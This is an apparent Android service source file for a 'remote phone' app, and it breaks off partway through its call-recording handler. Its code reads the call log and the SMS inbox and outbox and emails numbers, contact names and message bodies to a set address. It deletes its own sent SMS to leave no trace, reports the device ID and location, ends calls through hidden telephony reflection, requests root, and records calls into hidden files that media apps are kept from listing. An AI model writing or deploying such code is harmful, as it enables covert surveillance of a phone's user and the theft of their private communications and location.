package com.wangling.remotephone;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InterruptedIOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

import com.android.internal.telephony.ITelephony;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.ysk.remoteaccess.R;

import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PreviewCallback;
import android.hardware.Camera.Size;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.ConnectivityManager;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.IHardwareService;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.SignalStrength;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.EditText;
import android.widget.LinearLayout;


public class MobileCameraService extends Service implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener {
	
	public void onError(MediaRecorder mr, int what, int extra) {
		// TODO Auto-generated method stub
	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		// TODO Auto-generated method stub
	}
	
	
	static final int WORK_MSG_CHECK = 1;
	
	class WorkerHandler extends Handler {
		
		public WorkerHandler() {
			
		}
		
		public WorkerHandler(Looper l) {
			super(l);
		}
		
		@Override
		public void handleMessage(Message msg) {
			
			int what = msg.what;
			
			switch(what)
			{
			case WORK_MSG_CHECK:
				if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
		    	{
					try {
						do_check_out_call();
						do_check_out_sms();
					}catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				Message send_msg = _instance.mWorkerHandler.obtainMessage(WORK_MSG_CHECK);
                _instance.mWorkerHandler.sendMessageDelayed(send_msg, 15000);
				break;
			}
			
			super.handleMessage(msg);
		}
	}
	
	
	public class CallContentObserver extends ContentObserver {

		public CallContentObserver(Handler handler) {
			super(handler);
			// TODO Auto-generated constructor stub
		}
		
		@Override  
	    public void onChange(boolean selfChange) {
			try {
				do_check_out_call();
				do_check_in_call();
			}catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	public class SMSContentObserver extends ContentObserver {

		public SMSContentObserver(Handler handler) {
			super(handler);
			// TODO Auto-generated constructor stub
		}
		
		@Override  
	    public void onChange(boolean selfChange) {
			try {
				do_check_out_sms();
				do_check_in_sms();
			}catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	void do_check_out_call()
	{
		if (null == _instance) {
			return;
		}
		Log.d(TAG, "do_check_out_call()...");
		
		String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE };
		
		Cursor cursor = _instance.getContentResolver().query(  
    			CallLog.Calls.CONTENT_URI,
                projection, // Which columns to return.  
                CallLog.Calls.TYPE + " = '"  
                        + CallLog.Calls.OUTGOING_TYPE + "'", // WHERE clause.  
                null, // WHERE clause value substitution  
                CallLog.Calls.DATE + " desc"); // Sort order.
        
        if (cursor == null)
    	{
    		return;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)));
            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_CALL_TIME, 0))
            {
            	cursor.close();
                return;
            }
            else {
            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_CALL_TIME, time);
            }
            Date d = new Date(time);
            String date = dateFormat.format(d);
            // 取得联系人名字 
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String person = findContactByNumber(_instance, number);
            
            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
			String format = _instance.getResources().getString(R.string.msg_on_call_out_format);
			String content = String.format(format, name, date, number, person);
            if (false == emailAddress.equals(""))
			{
				NativeSendEmail(emailAddress, content, content);
			}
			
            cursor.close();
            return;
        }
    	cursor.close();
    	return;
	}
	
	void do_check_in_call()
	{
		if (null == _instance) {
			return;
		}
		Log.d(TAG, "do_check_in_call()...");
		
		String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE };
		
		Cursor cursor = _instance.getContentResolver().query(  
    			CallLog.Calls.CONTENT_URI,
                projection, // Which columns to return.  
                CallLog.Calls.TYPE + " != '"  
                        + CallLog.Calls.OUTGOING_TYPE + "'", // WHERE clause.  
                null, // WHERE clause value substitution  
                CallLog.Calls.DATE + " desc"); // Sort order.
        
        if (cursor == null)
    	{
    		return;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)));
            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_CALL_TIME, 0))
            {
            	cursor.close();
                return;
            }
            else {
            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_CALL_TIME, time);
            }
            Date d = new Date(time);
            String date = dateFormat.format(d);
            // 取得联系人名字 
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String person = findContactByNumber(_instance, number);
            
            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
			String format = null;
			int call_type = Integer.parseInt(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
			if (call_type == CallLog.Calls.INCOMING_TYPE) {
				format = _instance.getResources().getString(R.string.msg_on_call_in_accepted_format);
			}
			else if (call_type == CallLog.Calls.MISSED_TYPE) {
				format = _instance.getResources().getString(R.string.msg_on_call_in_missed_format);
			}
			else {
				format = _instance.getResources().getString(R.string.msg_on_call_in_rejected_format);
			}
			String content = String.format(format, name, date, number, person);
            if (false == emailAddress.equals(""))
			{
				NativeSendEmail(emailAddress, content, content);
			}
			
            cursor.close();
            return;
        }
    	cursor.close();
    	return;
	}
	
	void do_check_out_sms()
	{
		if (null == _instance) {
			return;
		}
		Log.d(TAG, "do_check_out_sms()...");
		
		String[] projection = { "address", "body", "date" };
		
		Cursor cursor = _instance.getContentResolver().query(  
    			Uri.parse("content://sms/sent"),
                projection, // Which columns to return.  
                null, // WHERE clause.  
                null, // WHERE clause value substitution  
                "date desc"); // Sort order.
        
        if (cursor == null)
    	{
    		return;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex("date")));
            if (time <= 5000 + AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_SMS_TIME, 0))
            {
            	cursor.close();
                return;
            }
            else {
            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_OUT_SMS_TIME, time);
            }
            Date d = new Date(time);
            String date = dateFormat.format(d);
            // 取得联系人名字 
            String number = cursor.getString(cursor.getColumnIndex("address"));
            String person = findContactByNumber(_instance, number);
            String body = cursor.getString(cursor.getColumnIndex("body"));
            
            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
			String format = _instance.getResources().getString(R.string.msg_on_sms_sent_format);
			String content = String.format(format, name, date, number, person, body);
            if (false == emailAddress.equals(""))
			{
				NativeSendEmail(emailAddress, content, content);
			}
			
            cursor.close();
            return;
        }
    	cursor.close();
    	return;
	}
	
	void do_check_in_sms()
	{
		if (null == _instance) {
			return;
		}
		Log.d(TAG, "do_check_in_sms()...");
		
		String[] projection = { "address", "body", "date" };
		
		Cursor cursor = _instance.getContentResolver().query(  
    			Uri.parse("content://sms/inbox"),
                projection, // Which columns to return.  
                null, // WHERE clause.  
                null, // WHERE clause value substitution  
                "date desc"); // Sort order.
        
        if (cursor == null)
    	{
    		return;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            long time = Long.parseLong(cursor.getString(cursor.getColumnIndex("date")));
            if (time <= AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_SMS_TIME, 0))
            {
            	cursor.close();
                return;
            }
            else {
            	AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_IN_SMS_TIME, time);
            }
            Date d = new Date(time);
            String date = dateFormat.format(d);
            // 取得联系人名字 
            String number = cursor.getString(cursor.getColumnIndex("address"));
            String person = findContactByNumber(_instance, number);
            String body = cursor.getString(cursor.getColumnIndex("body"));
            
            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
			String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
			String format = _instance.getResources().getString(R.string.msg_on_sms_recv_format);
			String content = String.format(format, name, date, number, person, body);
            if (false == emailAddress.equals(""))
			{
				NativeSendEmail(emailAddress, content, content);
			}
			
            cursor.close();
            return;
        }
    	cursor.close();
    	return;
	}
	
	void delete_sent_sms(String remote_num, String content)
	{
		final String _content = content;
		_instance.mMainHandler.postDelayed(new Runnable(){
			@Override
			public void run() {
				try {
					_instance.getContentResolver().delete(Uri.parse("content://sms"), "body=\"" + _content + "\"", null);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, 2500);
	}
	
	void delete_recv_sms(String remote_num, String content)
	{
		final String _content = content;
		_instance.mMainHandler.postDelayed(new Runnable(){
			@Override
			public void run() {
				try {
					_instance.getContentResolver().delete(Uri.parse("content://sms"), "body=\"" + _content + "\"", null);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, 2500);
	}
	
	
	static final int UI_MSG_AUTO_START = 1;
	static final int UI_MSG_DISPLAY_CAMERA_ID = 2;
	static final int UI_MSG_RELEASE_MP = 3;
	
	class MainHandler extends Handler {
		
		public MainHandler() {
			
		}
		
		public MainHandler(Looper l) {
			super(l);
		}
		
		@Override
		public void handleMessage(Message msg) {
			
			int what = msg.what;
			
			switch(what)
			{
			case UI_MSG_AUTO_START:
				_instance.onBtnArm();
				if (hasRootPermission())
				{
					Log.d(TAG, "Running as root...");
					try {
						Process sh = Runtime.getRuntime().exec("su", null, new File("."));
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				break;
				
			case UI_MSG_DISPLAY_CAMERA_ID://arg1,arg2
				int comments_id = msg.arg1;
				boolean approved = (msg.arg2 == 1);
				AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_CAMID, comments_id);
				
				//if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
		    	//{
		    	//	SharedFuncLib.MyMessageTip(_instance, "Online (ID:" + comments_id + ")");
		    	//}
				
				{//安装后只发送一次短信通知，报告ID号
					String smsPhoneNum = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
					if (false == smsPhoneNum.equals(""))
					{
						sendSMS(smsPhoneNum, "ID=" + comments_id);
						AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
					}
				}
				
				long nowTime = System.currentTimeMillis();
				long lastOnlineTime = AppSettings.GetSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_ONLINE_TIME, 0);
				if (nowTime - lastOnlineTime >= 1000*3600*24)
				{
					AppSettings.SaveSoftwareKeyLongValue(_instance, AppSettings.STRING_REGKEY_NAME_LAST_ONLINE_TIME, nowTime);
					
					String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
					String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
					String format = _instance.getResources().getString(approved ? R.string.msg_on_camid_ok : R.string.msg_on_camid_ng);
					String content = String.format(format, name, comments_id);
					if (Build.VERSION.SDK_INT >= 19) {//Android 4.4
						content +=  _instance.getResources().getString(R.string.msg_on_camid_ok_suffix);
					}
					
					if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
			    	{
						if (false == emailAddress.equals(""))
						{
							NativeSendEmail(emailAddress, content, content);
						}
			    	}
				}
				
				//if (false == approved) {
				//	_instance.stopSelf();
				//}
				break;
				
			case UI_MSG_RELEASE_MP://obj
				MediaPlayer mp = (MediaPlayer)(msg.obj);
				mp.stop();
				mp.release();
				Log.d(TAG, "MediaPlayer released!");
				if(_instance != null) _instance.mSkipAudioCount += 1;
				break;
				
			default:
				break;				
			}
			
			super.handleMessage(msg);
		}
	}
	
	private void sendEmail(String emailAddress, String subject, String content)
	{
		String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
		NativeSendEmail(emailAddress, name + " " + subject, content);
	}
	
    private void sendSMS(String phoneNumber, String message)
    {
    	phoneNumber = phoneNumber.replace(" ", ";");
    	phoneNumber = phoneNumber.replace(",", ";");
        String[] numArray = phoneNumber.split(";");
    	
	    // ---sends an SMS message to another device---   
	    SmsManager sms = SmsManager.getDefault();   
	  
	    for (int i = 0; i < numArray.length; i++)
	    {
	    	numArray[i] = numArray[i].trim();
	    	if (numArray[i].equals("")) {
	    		continue;
	    	}
	    	
	        ArrayList<String> msgs = sms.divideMessage(message);   
	        for (String msg : msgs) {   
	        	Log.d(TAG, "sms.sendTextMessage(" + numArray[i] + ", " + msg + ")...");
	        	sms.sendTextMessage(numArray[i], null, msg, null, null);
	        	
	        	delete_sent_sms(numArray[i], msg);
	        }     
	    }
    }
    
    private void endCall()
    {
    	//初始化iTelephony
		Class <TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;

		try {
			// 获取所有public/private/protected/默认   方法的函数，
            // 如果只需要获取public方法，则可以调用getMethod.   
			getITelephonyMethod = c.getDeclaredMethod("getITelephony", (Class[])null);
			
			// 将要执行的方法对象设置是否进行访问检查，也就是说对于public/private/protected/默认   
            // 我们是否能够访问。值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。
			// 值为 false 则指示反射的对象应该实施 Java 语言访问检查。   
			getITelephonyMethod.setAccessible(true);
			
			ITelephony iTelephony = (ITelephony) getITelephonyMethod.invoke(mTelephonyManager, (Object[])null);
			iTelephony.endCall();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }

    private void silenceRinger()
    {
    	//初始化iTelephony
		Class <TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;

		try {
			// 获取所有public/private/protected/默认   方法的函数，
            // 如果只需要获取public方法，则可以调用getMethod.   
			getITelephonyMethod = c.getDeclaredMethod("getITelephony", (Class[])null);
			
			// 将要执行的方法对象设置是否进行访问检查，也就是说对于public/private/protected/默认   
            // 我们是否能够访问。值为 true 则指示反射的对象在使用时应该取消 Java 语言访问检查。
			// 值为 false 则指示反射的对象应该实施 Java 语言访问检查。   
			getITelephonyMethod.setAccessible(true);
			
			ITelephony iTelephony = (ITelephony) getITelephonyMethod.invoke(mTelephonyManager, (Object[])null);
			iTelephony.silenceRinger();  
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
	
    private boolean isAuthPhone(String incomingNumber)
    {
    	boolean bAuthPhone = false;
		String smsPhoneNum = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
		String phoneNum = smsPhoneNum;
		phoneNum = phoneNum.replace(" ", ";");
		phoneNum = phoneNum.replace(",", ";");
		String[] numArray = phoneNum.split(";");
		for (int i = 0; i < numArray.length; i++)
	    {
	    	numArray[i] = numArray[i].trim();
	    	if (false == numArray[i].equals("")) {
	    		if (incomingNumber.equals(numArray[i]) || 
	    				( incomingNumber.startsWith("+") && incomingNumber.contains(numArray[i]) ) ||
	    				( numArray[i].startsWith("+")    && numArray[i].contains(incomingNumber) )     ) {
	    			bAuthPhone = true;
	    			break;
	    		}
	    	}
	    }
		return bAuthPhone;
    }
    
    private String GenerateLocationMsg(Context context)
    {
    	if (_instance != null &&
    			(Math.abs(_instance.mBaiduLongitude) >= 0.01 || Math.abs(_instance.mBaiduLatitude) >= 0.01)) {
			String strGPSLongi = String.format("%.5f", _instance.mBaiduLongitude);
			String strGPSLati  = String.format("%.5f", _instance.mBaiduLatitude);
        	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
    	}
    	
    	LocationManager locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
        boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        boolean networkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        
        if (gpsEnabled)
        {
        	Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
    		if (null != lastLoc)
    		{
    			Log.d(TAG, "GPS_PROVIDER " + lastLoc.toString());
    			String strGPSLongi = String.format("%.4f", lastLoc.getLongitude());
    			String strGPSLati  = String.format("%.4f", lastLoc.getLatitude());
            	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
    		}
        }
        
        if (networkEnabled)
        {
	    	Location lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
			if (null != lastLoc)
			{
				Log.d(TAG, "NETWORK_PROVIDER " + lastLoc.toString());
				String strGPSLongi = String.format("%.4f", lastLoc.getLongitude());
				String strGPSLati  = String.format("%.4f", lastLoc.getLatitude());
	        	return String.format(context.getResources().getString(R.string.msg_sms_location_format), "http://ykz.e2eye.com/LocMap.php?lati=" + strGPSLati + "&longi=" + strGPSLongi);
			}
        }
        
        return "http://ykz.e2eye.com/cloudctrl/LocationMap.php";
    }
    
    public void SendStatusReport(String toAddress)
    {
    	String comments_id_str = null;
    	String wifi_status_str = null;
    	String battery_percent_str = null;
    	
    	int comments_id = AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_CAMID, 0);
    	if (0 == comments_id) {
    		comments_id_str = getResources().getString(R.string.msg_unknown_val);
    	}
    	else {
    		comments_id_str = String.format("%d", comments_id);
    	}
    	
    	WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
	    boolean bWifiEnabled = wifiManager.isWifiEnabled();
	    if (bWifiEnabled) {
	    	wifi_status_str = getResources().getString(R.string.msg_sms_cmd_result_enabled);
	    }
	    else {
	    	wifi_status_str = getResources().getString(R.string.msg_sms_cmd_result_disabled);
	    }
	    
	    if (0 == m_battery_percent) {
	    	battery_percent_str = getResources().getString(R.string.msg_unknown_val);
	    }
	    else {
	    	battery_percent_str = String.format("%d%%", m_battery_percent);
	    }
	    
	    String body = String.format(getResources().getString(R.string.msg_sms_cmd_query_result_format), 
	    		comments_id_str, wifi_status_str, battery_percent_str);
	    
	    //_instance.sendSMS(toNumber, body);
	    if (false == toAddress.equals(""))
	    {
	    	NativeSendEmail(toAddress, body, body);
	    }
    }
    
    public void UnknownSmsCmd(String toNumber, String sms_cmd)
    {
    	String fmt = _instance.getResources().getString(R.string.msg_sms_cmd_result_0);
    	if (sms_cmd.length() < fmt.length()) {
    		_instance.sendSMS(toNumber, String.format(fmt, sms_cmd));
    	}
    }
    
    private String findSimItem1(Context context, String address)
    {
    	String[] projection = { "name",  "number" };
    	
    	Cursor cursor = context.getContentResolver().query(  
    			Uri.parse("content://icc/adn"),
                projection, // Which columns to return.  
                "number = '"  
                        + address + "'", // WHERE clause.  
                null, // WHERE clause value substitution  
                null); // Sort order.
    	if (cursor == null)
    	{
    		cursor = context.getContentResolver().query(  
    				Uri.parse("content://icc/adn"),
                    projection, // Which columns to return.  
                    "number = '"  
                            + "+86" + address + "'", // WHERE clause.  
                    null, // WHERE clause value substitution  
                    null); // Sort order.
        }
    	if (cursor == null)
    	{
    		return "?";
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            // 取得联系人名字 
            int nameFieldColumnIndex = cursor.getColumnIndex("name");
            String name = cursor.getString(nameFieldColumnIndex);
            cursor.close();
            return name;
        }
    	cursor.close();
    	return "?";
    }
    
    private String findSimItem2(Context context, String address)
    {
    	String[] projection = { "name",  "number" };
    	
    	Cursor cursor = context.getContentResolver().query(  
    			Uri.parse("content://sim/adn"),
                projection, // Which columns to return.  
                "number = '"  
                        + address + "'", // WHERE clause.  
                null, // WHERE clause value substitution  
                null); // Sort order.
    	if (cursor == null)
    	{
    		cursor = context.getContentResolver().query(  
    				Uri.parse("content://sim/adn"),
                    projection, // Which columns to return.  
                    "number = '"  
                            + "+86" + address + "'", // WHERE clause.  
                    null, // WHERE clause value substitution  
                    null); // Sort order.
        }
    	if (cursor == null)
    	{
    		return "?";
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            // 取得联系人名字 
            int nameFieldColumnIndex = cursor.getColumnIndex("name");
            String name = cursor.getString(nameFieldColumnIndex);
            cursor.close();
            return name;
        }
    	cursor.close();
    	return "?";
    }
    
    private String findContactByNumber(Context context, String address)
    {
    	address = address.replace(" ", "");
    	if (address.startsWith("+86"))
		{
    		address = address.replace("+86", "");
		}
    	if (address.equals(""))
    	{
    		return "?";
    	}
    	
    	String[] projection = { ContactsContract.Contacts.DISPLAY_NAME,  
                ContactsContract.CommonDataKinds.Phone.NUMBER };
    	
    	Cursor cursor = context.getContentResolver().query(  
    			ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  
                projection, // Which columns to return.  
                ContactsContract.CommonDataKinds.Phone.NUMBER + " = '"  
                        + address + "'", // WHERE clause.  
                null, // WHERE clause value substitution  
                null); // Sort order.
    	if (cursor == null)
    	{
    		cursor = context.getContentResolver().query(  
    				ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  
                    projection, // Which columns to return.  
                    ContactsContract.CommonDataKinds.Phone.NUMBER + " = '"  
                            + "+86" + address + "'", // WHERE clause.  
                    null, // WHERE clause value substitution  
                    null); // Sort order.
        }
    	if (cursor == null)
    	{
    		String name = "?";
    		try {
    			name = findSimItem1(context, address);
    		} catch (Exception e) {
    			// TODO Auto-generated catch block
    			e.printStackTrace();
    		}
    		if (name.equals("?"))
    		{
    			try {
        			name = findSimItem2(context, address);
        		} catch (Exception e) {
        			// TODO Auto-generated catch block
        			e.printStackTrace();
        		}
    		}
    		return name;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            // 取得联系人名字 
            int nameFieldColumnIndex = cursor  
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            String name = cursor.getString(nameFieldColumnIndex);
            cursor.close();
            return name;
        }
    	cursor.close();
    	return "?";
    }
    
    public class MyPhoneStateListener extends PhoneStateListener{  
    	static final String VOICE_RECORD_FOLDER = "lixianluyin";
    	static final String VOICE_CALL_FILE = "voice_call";
    	MediaRecorder mVoiceRecorder = null;
    	String voiceRecordFile = null;
    	
    	String get_voice_record_file(String incomingNumber, String contactName)
    	{
    		String sd_path = "/sdcard";
    		String file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
    		File dir = new File(file_path);
    		if (false == dir.exists()) {
    			sd_path = "/storage/sdcard0";
    			file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
        		dir = new File(file_path);
        		if (false == dir.exists()) {
        			sd_path = "/storage/sdcard1";
        			file_path = sd_path + "/" + VOICE_RECORD_FOLDER;
            		dir = new File(file_path);
            		if (false == dir.exists()) {
            			Log.d(TAG, "SD-Card no folder " + VOICE_RECORD_FOLDER);
            			return null;
            		}
        		}
    		}
    		
    		//防止音乐应用搜索到录音文件
    		File nomedia = new File(file_path + "/" + ".nomedia");
    		if (false == nomedia.exists()) {
    			try {
					nomedia.createNewFile();
				} catch (Exception e) {}
    		}
    		
        	StatFs sf = null;
        	try {
        		sf = new StatFs(sd_path);
        	} catch (Exception e) {
        		return null;
        	}
    		
        	long blockSize = sf.getBlockSize();
        	long availableBlocks = sf.getAvailableBlocks();
        	long freeKB = blockSize*availableBlocks/1024;
        	Log.d(TAG, "SD-Card available size: "+ freeKB + "KB");
        	if (freeKB < 1024/*KB*/) {
        		Log.d(TAG, "SD-Card available size to small, skip!!!");
        		return null;
        	}
        	
    		if (freeKB < 1024*32) {
    			delete_the_oldest_file(dir);
    		}
    		
        	SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss");
        	long milliseconds = System.currentTimeMillis();
        	String time_str = sDateFormat.format(new java.util.Date(milliseconds));
        	
        	incomingNumber = incomingNumber.replace("+", "");
        	contactName = contactName.replace("/", "");
        	contactName = contactName.replace("\\", "");
        	contactName = contactName.replace("\'", "");
        	contactName = contactName.replace("\"", "");
        	contactName = contactName.replace("*", "");
        	contactName = contactName.replace("?", "");
        	contactName = contactName.replace(":", "");
        	contactName = contactName.replace("|", "");
        	contactName = contactName.replace("<", "");
        	contactName = contactName.replace(">", "");
        	String strFilePath = String.format("%s/.%s_%s(%s).amr", file_path, time_str, incomingNumber, contactName);
        	return strFilePath;
    	}
    	
    	boolean is_record_from_voicecall()
    	{
    		if (null == voiceRecordFile) {
    			return false;
    		}
    		File f = new File(voiceRecordFile);
    		File f2 = new File(f.getParent() + "/" + VOICE_CALL_FILE);
    		return f2.exists();
    	}
    	
        void delete_the_oldest_file(File dir)
        {
        	if (dir.isDirectory() == false) {
        		return;
        	}
        	
        	File[] files = dir.listFiles();
        	if (files == null) {
        		return;
        	}
        	
        	Long oldest_time = Long.MAX_VALUE;
        	File oldest_file = null;
        	for (int i = 0; i < files.length; i++)
        	{
        		Long time = files[i].lastModified();
        		if (time == 0) {
        			continue;
        		}
        		if (time < oldest_time) {
        			oldest_time = time;
        			oldest_file = files[i];
        		}
        	}
        	
        	if (oldest_file != null) {
        		oldest_file.delete();
        		Log.d(TAG, "SD-Card delete oldest file!!!");
        	}
        }
    	
        @Override  
        public void onCallStateChanged(int state, String incomingNumber) {
            
            switch (state)  {   
            case TelephonyManager.CALL_STATE_IDLE:   
                //CALL_STATE_IDLE
            	if (mVoiceRecorder != null)
	            {
            		Log.d(TAG, "mVoiceRecorder stop...");
        		    //wait for a while
        	        try {
        	        	mVoiceRecorder.stop();
        	        	
        	            Thread.sleep(1000);
        	            
            	        mVoiceRecorder.reset();
        	        } catch (Exception e1) {
        	        	e1.printStackTrace();
        	        }
        	        mVoiceRecorder.release();
        		    mVoiceRecorder = null;
	            }
                break;
                
            case TelephonyManager.CALL_STATE_OFFHOOK:   
                //CALL_STATE_OFFHOOK
            	if (null != (voiceRecordFile = get_voice_record_file(incomingNumber, findContactByNumber(_instance, incomingNumber))))
            	{
            		try {
	            		mVoiceRecorder = new MediaRecorder();
	            		if (is_record_from_voicecall()) {
